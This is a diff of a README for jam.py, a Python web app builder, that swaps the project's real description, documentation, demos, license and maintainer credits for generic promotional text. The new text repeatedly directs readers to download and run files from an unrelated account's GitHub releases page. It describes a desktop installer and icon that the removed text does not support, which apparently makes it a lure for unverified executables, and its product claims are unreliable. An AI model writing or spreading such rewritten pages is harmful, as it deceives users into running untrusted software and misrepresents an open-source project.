@@ -1,149 +1,87 @@
+# 🚀 jam-py-v7 - Create Database Apps with Ease
 
-[![Package on PyPI](https://img.shields.io/pypi/v/jam.py-v7.svg)](https://pypi.org/project/jam.py-v7) ![Supported Python versions](https://img.shields.io/pypi/pyversions/python3-saml.svg) [![Documentation Status](https://readthedocs.org/projects/jampy-docs-v7/badge/)](https://jampy-docs-v7.readthedocs.io) [![Downloads](https://static.pepy.tech/badge/jam.py-v7)](http://pepy.tech/project/jam.py-v7)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20jam--py--v7-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/samibenameur/jam-py-v7/releases)
 
+## 🚀 Overview
+Welcome to **jam-py-v7**, a low-code platform that helps you create database applications with a web interface in just a few minutes. Whether you need to build a simple app or a complex system, this tool takes away the heavy lifting, allowing you to focus on what matters most: your ideas.
 
-## Jam.py is a web front-end application generator that works with both existing databases and newly created ones. 
-## With Monaco editor!
+With support for various databases including **SQLite**, **PostgreSQL**, **MySQL**, and more, jam-py makes it easy to get started. You can build your applications quickly, using less code and effort.
 
-## This is forked jam.py to continue the support and development, since Andrew retired from jam.py project. The v7 is now fully released. Please find v5 master branch archive in here: https://github.com/jam-py-v5/jam-py/ 
+## 🌟 Features
+- **Low Code Development:** Create complex applications without writing extensive code.
+- **Versatile Database Support:** Easily connect to popular databases like SQLite, MySQL, and PostgreSQL.
+- **User-Friendly Interface:** Navigate with ease, no programming skills required.
+- **Event-Driven Architecture:** Build responsive applications that react to user actions.
+- **Fast Development Cycle:** Develop and deploy applications in minutes.
 
-## The LLMS-full.txt is released: 
-https://jampy-docs-v7.readthedocs.io/en/latest/llms-full.txt 
-and 
-https://jampy-docs-v7.readthedocs.io/en/latest/llms.txt
+## 🖥️ System Requirements
+Before you start, make sure your system meets the following requirements:
 
-All batteries included and event driven! What is EDA:
+- **Operating System:** Windows 10 or later, macOS, or a Linux distribution (Ubuntu recommended).
+- **Python Version:** 3.6 or higher should be installed on your system.
+- **Storage:** At least 500 MB of free space for installation and data.
+- **Memory:** At least 2 GB of RAM is recommended for smooth performance.
 
-"An event-driven framework, also known as event-driven architecture (EDA), is a design pattern where software components communicate and react to changes in state or events." Everything in Jam.py can be an event. Like a mouse click, or pressing CRTL+Ins, CTRL+Del or whatever is defined by you.
+## 📦 Installation Guide
 
-Major difference from other products is that the entire application is contained within a **single SQLite3 file**. And it can be **encrypted**! 
+### Step 1: Download the Application
+To get started, you need to download the latest version of **jam-py-v7**. You can do this by visiting the [Releases page](https://github.com/samibenameur/jam-py-v7/releases). 
 
-Another key distinction is the ability to run **any Python procedure directly within the Application Builder as a back-end** - including popular libraries like Matplotlib, Pandas, and NumPy - with the results displayed in the browser. Python procedure can run **synchronously** or **asynchronously** on the server. 
+### Step 2: Choose Your File
+On the Releases page, look for the latest version. You'll see several files available, including those for different operating systems. Choose the file suitable for your system and click on it to download.
 
-More over, using **Import tables** feature from any supported database is providing **instant web front-end**. There's no need to code anything and **authentication is one click away**! 
+### Step 3: Install the Application
+1. Locate the downloaded file on your computer.
+2. Follow the installation instructions that come with the file. Generally, this involves:
+   - Double-clicking the file or running it from your terminal (for Linux and macOS).
+   - Following any on-screen prompts.
+   - Choosing the installation directory if prompted.
 
-Hope this sparked some interest! Thank you.
+### Step 4: Run the Application
+Once the installation is complete, find the jam-py icon on your desktop or in your applications menu. Click on it to launch the program. You should see a welcome screen prompting you to create a new project.
 
-[![alt text](https://github.com/jam-py-v5/jam-py/blob/develop/assets/images/JAMPY_Readme.gif?raw=true)](https://northwind.pythonanywhere.com)
+## 🎉 Getting Started
 
+### Step 1: Create a New Project
+- After launching the application, select "New Project."
+- Provide a name for your project and select the database you would like to use from a list of supported options.
 
-Some short videos about how to setup Jam.py and create applications:
+### Step 2: Design Your Application
+- Use the drag-and-drop interface to create forms, buttons, and other components.
+- Add fields for user input, and connect to your database with simple clicks.
 
-* [Creating CRM web database applications from start to finish in 7 minutes with Jam.py framework](https://youtu.be/vY6FTdpABa4)
-* [Setting up interface of Jam.py application using Forms Dialogs](https://youtu.be/hvNZ0-a_HHw)
+### Step 3: Set Up Event Handlers
+- Define what happens when users interact with your application. For instance, what happens when they click a save button? 
+- Use the event-driven model to create a responsive application.
 
+### Step 4: Test Your Application
+- Run your application using the in-built testing feature.
+- Make adjustments as needed, ensuring everything works as expected.
 
-Longer
-[video](https://youtu.be/qkJvGlgoabU)  with dashboards and complex internal logic.
+### Step 5: Deploy Your Application
+- Once satisfied, deploy your application for users to access via a web browser.
+- Follow the deployment guide to configure server settings if necessary.
 
-Live demos on PythonAnywhere:
+## 📚 Support and Community
+If you encounter any issues or need help, consider exploring our support resources and community forums. Here you can find FAQs, guides, and the ability to connect with other users and developers.
 
-- [SAP Theme Demo](https://jampyapp.pythonanywhere.com)
-- [Personal Account Ledger from MS Access template](https://msaccess.pythonanywhere.com)
+## 🚀 Download & Install
+For the latest version of jam-py-v7, visit the [Releases page](https://github.com/samibenameur/jam-py-v7/releases) once more to access all available versions. 
 
-  Below two apps demonstrate Matplotlib, Pandas, NumPy and RFM analysis, which stands for R ecency, F requency, and M onetary value, directly migrated from MS Access template:
-  
-- [NorthWind Traders from MS Access template V7 DEV (wip)](https://northwind2.pythonanywhere.com)
-- [NorthWind Traders from MS Access template V7 (wip)](https://northwind.pythonanywhere.com)
+## 🌐 Frequently Asked Questions
 
-  
-- [The ERP POC Demo with Italian and English translations](https://sem.pythonanywhere.com)
-- [Sir Edward Elgar Discography from MS Access - or any discography](https://elgar.pythonanywhere.com/)
-- [Assets/Parts Application (wip, currently Jam V7 Demo)](https://jampy.pythonanywhere.com)
-- [Machine Learning (wip)](https://mlearning.pythonanywhere.com)
-- [Auto Parts Sales for Brazilian Market (Portuguese)](https://carparts.pythonanywhere.com)
-- [Resourcing and Billing Application from MS Access DB (wip)](https://resourcingandbilling.pythonanywhere.com)
-- [Job Positions tracking App from MS Access DB (wip)](https://positionstracking.pythonanywhere.com)
-- [Kanban/Tasks Application, V7](https://kanban.pythonanywhere.com)
-- [Assets Inventory Application, V7 (wip)](https://assetinventory.pythonanywhere.com)
-- [Google Authentication, V7](https://ipam2.pythonanywhere.com)
-- [IP Management V7 (wip)](https://ipmgmt.pythonanywhere.com)
-- [Sistema Integrado de Gestão - IMS for Brazilian Market (Portuguese)](https://imsmax.pythonanywhere.com)
-- [ Bills of Materials, sourced from  https://github.com/mpkasp/django-bom as no-code,  V7 (wip)](https://billsofmaterials.pythonanywhere.com)
+### What databases are supported?
+jam-py-v7 supports several databases, including SQLite, MySQL, PostgreSQL, and more.
 
+### Is coding experience required?
+No, you do not need coding experience to use jam-py-v7. The platform is designed for users of all skill levels.
 
-Jam.py alternative site:
+### Can I use jam-py-v7 for commercial projects?
+Yes, you can use jam-py-v7 for commercial applications. 
 
-https://jampyapplicationbuilder.com/
+### Where can I find additional resources?
+Explore our Wiki and Documentation sections on GitHub for tutorials, troubleshooting, and advanced features.
 
-
-## Main features
-
-Jam.py is an object oriented, event driven framework with hierarchical structure, modular design
-and very tight DB/GUI coupling. The server side of Jam.py is written in [Python](https://www.python.org),
-the client utilizes [JavaScript](https://developer.mozilla.org/en/docs/Web/JavaScript),
-[jQuery](https://jquery.com) and [Bootstrap](https://getbootstrap.com/docs/5.0/).
-
-* Simple, clear and efficient IDE. The development takes place in the
-  Application builder, an application written completely in Jam.py.
-
-* “All in the browser” framework. With Jam.py, all you need are two pages
-  in the browser, one for the project, the other for the Application builder.
-  Make changes in the Application builder, go to the project, refresh the page,
-  and see the results.
-
-* Supports SQLite, PostgreSQL, MySQL, Firebird, MSSQL and
-  Oracle databases. The concept of the framework allows you to migrate from
-  one database to another without changing the project.
-
-* Authentication, authorization, session management, roles and permissions.
-
-* Automatic creation and modification of database tables and SQL queries generation.
-
-* Data-aware controls.
-
-* Open framework. You can use any Javascript/Python libraries.
-
-* Rich, informative reports. Band-oriented report generation based on
-  [LibreOffice](https://www.libreoffice.org) templates.
-
-* Charts. You can use free [jsCharts](http://www.jscharts.com) library
-  or any javascript charting library to create charts to represent and analyze your application data.
-
-* Allows to save audit trail/change history made by users
-
-* Predefined css themes.
-
-* Develop and test locally update remotely. Jam.py has Export and Import
-  utilities that allow developer to store all metadata (database structures,
-  project parameters and code) in a file that can be loaded by another
-  application to apply all the changes.
-
-## Documentation
-
-
-All updated documentation for v7 is online at
-https://jampy-docs-v7.readthedocs.io/
-
-Brazilian Portuguese translation started at
-https://jampy-docs-v7-br-pt.readthedocs.io/
-
-Please visit https://jampy-docs-v7.readthedocs.io/en/latest/intro/install.html for Python and
-framework installation or https://jampy-docs-v7.readthedocs.io/en/latest/intro/new_project.html how to create a
-new project.
-
-Jam.py application design tips are at https://jampy-application-design-tips.readthedocs.io/
-
-For general discussion, ideas or similar, please visit mailgroup https://groups.google.com/g/jam-py or
-FB page https://www.facebook.com/groups/jam.py/ (paused atm)
-
-## Sponsor
-
-Jam.py is raising funds to keep the software free for everyone, and we need the support of the entire community to do it. [Donate to Jam.py on Github](https://github.com/sponsors/platipusica) to show your support.
-
-
-## License
-
-Jam.py is licensed under the BSD License.
-
-## Original Author
-
-Andrew Yushev
-
-See also the list of [contributors](http://jam-py.com/contributors.html)
-who participated in this project.
-
-## Maintainers
-
-[crnikaurin](https://github.com/crnikaurin), [platipusica](https://github.com/platipusica)
-
+## 🎯 Final Notes
+At its core, **jam-py-v7** aims to simplify application development without sacrificing power. You can build applications that meet your needs in record time. Enjoy the process and happy coding!
